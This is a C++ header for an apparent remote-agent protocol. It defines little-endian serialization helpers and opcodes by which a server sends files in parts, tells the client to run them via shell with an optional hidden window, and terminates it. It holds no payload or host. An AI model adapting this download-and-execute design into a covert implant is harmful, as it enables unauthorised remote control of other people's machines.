#pragma once
#include <stdint.h>

/**
 * Integers in the agent protocol are encoded as little endian.
 */
namespace AgentProtocol {
	inline uint8_t ReadUint8(uint8_t* p) {
		return p[0];
	}

	inline uint8_t ReadUint8(uint8_t** ptr) {
		uint8_t* p = *ptr;
		*ptr += sizeof(uint8_t);
		return ReadUint8(p);
	}

	inline uint16_t ReadUint16(uint8_t** ptr) {
		uint8_t* p = *ptr;
		*ptr += sizeof(uint16_t);
		return p[0] | (p[1] << 8);
	}

	inline uint32_t ReadUint32(uint8_t** ptr) {
		uint8_t* p = *ptr;
		*ptr += sizeof(uint32_t);
		return p[0] | (p[1] << 8) | (p[2] << 16) | (p[3] << 24);
	}

	inline void WriteUint8(uint8_t val, uint8_t** dst) {
		uint8_t* p = *dst;
		p[0] = val;
		*dst += sizeof(uint8_t);
	}

	inline void WriteUint16(uint16_t val, uint8_t* p) {
		p[0] = val & 0xFF;
		p[1] = (val & 0xFF00) >> 8;
	}

	inline void WriteUint16(uint16_t val, uint8_t** dst) {
		uint8_t* p = *dst;
		WriteUint16(val, p);
		*dst += sizeof(uint16_t);
	}

	inline void WriteUint32(uint32_t val, uint8_t** dst) {
		uint8_t* p = *dst;
		p[0] = val & 0xFF;
		p[1] = (val & 0xFF00) >> 8;
		p[2] = (val & 0xFF0000) >> 16;
		p[3] = (val & 0xFF000000) >> 24;
		*dst += sizeof(uint32_t);
	}

	// Opcodes sent by the client
	enum ClientOpcode {
		kGetAgent,
		kHeartbeat,
		kConnect,
		kFileCreationSuccess,
		kFileCreationNewName,
		kFileCreateFailed,
		kFileWriteFailed,
		kShellExecResult
	};

	// Opcodes sent by the server
	enum ServerOpcode {
		kSetProcInt,
		kFileDlBegin,
		kFileDlPart,
		kFileDlEnd,
		kFileDlEndShellExec,
		kTerminate
	};

	enum ShowWindow {
		kHide = 0,
		kShow = 1
	};

	const size_t kBufferSize = 8192; // 8 KiB
	const int kHeaderSize = sizeof(uint16_t) + sizeof(uint8_t);
	const int kBodySize = kBufferSize - kHeaderSize;

} // namespace AgentProtocol
